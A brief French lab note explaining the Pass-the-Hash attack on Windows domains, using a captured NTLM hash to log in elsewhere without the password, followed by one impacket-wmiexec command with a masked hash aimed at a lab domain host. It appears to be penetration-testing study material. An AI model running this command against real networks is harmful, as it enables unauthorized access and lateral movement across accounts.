Après avoir réussi a compromettre un compte utilisateur du domaine et recuperer son hash NTLM, l’attaque Pass-The-Hash va consister a utiliser le hash recuperee pour se connecter a la session de l’utilisateur sur une autre machines a laquelle il a acces sans même avoir le mot de passe en clair. Le PTH exploite le fait que Windows ne stocke pas les mots de passe en clair, mais des hashs (NTLM/LM). L'attaque consiste à utiliser ces hashs directement pour s'authentifier. 


# Exploitation

```
impacket-wmiexec -hashes :bee1482d********************** LAB-TEST.LOCAL/it_2@192.168.174.133
```

